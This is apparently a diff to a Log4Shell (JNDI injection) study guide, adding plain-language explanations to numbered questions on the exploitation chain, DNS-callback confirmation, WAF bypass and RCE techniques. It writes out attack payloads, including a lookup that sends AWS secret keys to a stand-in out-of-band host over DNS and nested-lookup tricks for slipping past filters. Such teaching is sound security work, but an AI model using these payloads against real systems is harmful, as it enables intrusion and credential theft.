@@ -11,8 +11,12 @@ Study guide + field reference. Impact-first: the finding is a **target-sourced O
 **1. What is JNDI?**
 Java Naming and Directory Interface — an API that resolves a **name** into a **Java object** via a backend (LDAP, RMI, DNS, IIOP, CORBA).
 
+> *Plain version:* JNDI is Java's directory-assistance — "look up this name, connect me to whatever it points to." The bug is that *you* supply the name, so you point Java at *your own* server, which hands back a booby-trapped object Java then builds and runs = code execution.
+
 **2. What is JNDI injection, in one sentence?**
 When an attacker controls the name passed to a JNDI lookup, they point the JVM at **their own** LDAP/RMI server, which returns a **malicious object** the JVM instantiates/deserializes → **RCE**.
+
+> *Plain version:* Log4j — a logging library in nearly every Java app — would perform that dangerous lookup on *anything it wrote to a log file.* So an attacker didn't need to reach the lookup directly; they just had to get their `${jndi:…}` string **logged** (a User-Agent, a username, a 404 path). Logging is everywhere and runs before login, so overnight every logged input became unauthenticated RCE.
 
 **3. What made Log4Shell so catastrophic?**
 Log4j's **message lookup** evaluated `${jndi:…}` inside *anything it logged* — so any attacker-influenced, logged string (a `User-Agent`, a username) became **unauthenticated RCE**, with a huge unexpected surface.
@@ -22,6 +26,8 @@ CVE-2021-44228 (CVSS 10.0).
 
 **5. Walk the exploitation chain.**
 Attacker supplies `${jndi:ldap://attacker/x}` → victim JVM does `lookup("ldap://attacker/x")` → attacker LDAP returns a Reference/serialized object → JVM fetches/instantiates/deserializes it → attacker code runs.
+
+> *Plain version:* to *look up* `ldap://something/`, Java first has to translate `something` into an IP — a DNS query. That query hits your listener before any real connection happens. So a DNS ping carrying your unique tag proves the server evaluated your payload — a complete, blind proof of the bug without ever running a command or seeing the response.
 
 **6. Why is a DNS callback enough to "confirm" it?**
 Log4j resolves the host **before** connecting; a DNS lookup from the target's egress carrying your token proves the `${jndi:}` was evaluated by a live sink — the blind-RCE proof, even with no shell.
@@ -40,6 +46,8 @@ CWE-917 (Expression Language Injection) — the `${…}` lookup — plus CWE-502
 
 **11. Does modern JDK fully fix it?**
 No. Modern JDK blocks the **remote-codebase** technique (`trustURLCodebase=false`), but the **serialized-gadget** and **BeanFactory/EL** techniques still achieve RCE.
+
+> *Plain version:* no — 2.15 stopped the *code-execution* part but still *resolves* lookups. Hide a secret-reading lookup inside the hostname (`${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.your-oob/}`) and the secret walks out as a DNS label. Cloud keys stolen, no code run. "We're on 2.15" is not "we're safe."
 
 **12. Does patching Log4j to 2.15 make you safe?**
 Not fully — 2.15 stopped remote RCE but **still did lookups**, so `${env:SECRET}` **exfil over DNS** works, and CVE-2021-45046 reintroduced RCE via a bypass.
@@ -140,6 +148,8 @@ Yes — point `${jndi:ldap://YOUR-IP:1389/}` at `poc/callback_listener.py`; a lo
 
 ## D. WAF / filter bypass (41–48)
 
+> *Plain version:* a WAF blocking `${jndi:` is matching the *word*, so you never spell it. Log4j resolves inner pieces first — `${lower:j}`→`j` — and reassembles `jndi` at runtime, after the filter already passed it. You spell the banned word out of Lego bricks the filter doesn't recognise.
+
 **41. Why can you obfuscate `jndi`?**
 Log4j evaluates **nested** `${…}` lookups, so you rebuild the word at runtime and no static signature matches.
 
@@ -167,6 +177,8 @@ Sometimes — encode the whole value or key characters to slip a regex, then the
 ---
 
 ## E. Exploitation techniques & JVM matrix (49–66)
+
+> *Plain version:* the callback proved Java phoned your server; now the server must hand back something that *runs.* (A) "download and run this class" — only old JVMs still trust it. (B) hand back a booby-trapped serialized object that detonates a gadget already on the target. (C) build the exploit from classes *already installed* (Tomcat's BeanFactory) so nothing's downloaded or deserialized — the modern-JVM bypass.
 
 **49. Name the three RCE delivery techniques.**
 (A) Remote codebase, (B) Serialized gadget, (C) Local factory / BeanFactory-EL.
